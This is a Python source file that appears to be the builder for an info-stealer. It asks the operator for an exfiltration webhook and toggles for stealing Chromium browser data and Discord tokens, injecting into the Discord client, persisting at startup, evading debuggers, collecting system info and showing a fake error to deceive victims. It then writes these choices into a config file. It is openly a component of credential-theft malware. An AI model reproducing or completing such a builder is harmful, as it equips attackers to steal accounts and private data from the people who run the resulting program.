import os

from .constants import build_dir, banner


class config_parse:
    def __init__(self) -> None:
        self.config_file = os.path.join(build_dir, 'src', 'config.py')
        
        self.opts = self.getopts()
        self.write()

    def getopts(self) -> dict:
        os.system('cls')
        print(banner)

        webhook = input('{:<27}: '.format('Webhook?'))
        chromium = input('{:<27}: '.format('Chromium Data? (y/n)'))
        debug = input('{:<27}: '.format('Anti Debug? (y/n)'))
        disctoken = input('{:<27}: '.format('Discord Token? (y/n)'))
        injection = input('{:<27}: '.format('Discord Injection? (y/n)'))
        startup = input('{:<27}: '.format('Startup Injection? (y/n)'))
        sysinfo = input('{:<27}: '.format('System Info? (y/n)'))
        fakeerror = input('{:<27}: '.format('Fake Error? (y/n)'))
        if fakeerror == 'y'.lower():
            fakeerrormsg = input('{:<27}: '.format('Fake Error Message?'))

        return {
            'webhook' : webhook,
            'chromium' : True if chromium == 'y'.lower() else False,
            'debug' : True if debug == 'y'.lower() else False,
            'disctoken' : True if disctoken == 'y'.lower() else False,
            'injection' : True if injection == 'y'.lower() else False,
            'startup' : True if startup == 'y'.lower() else False,
            'sysinfo' : True if sysinfo == 'y'.lower() else False,
            'fakeerror' : {
                'use' : True if fakeerror == 'y'.lower() else False,
                'message' : fakeerrormsg if fakeerror == 'y'.lower() else None
            }
        }

    def write(self) -> None:
        with open(self.config_file, 'w') as f:
            f.write('__CONFIG__ = ' + str(self.opts))
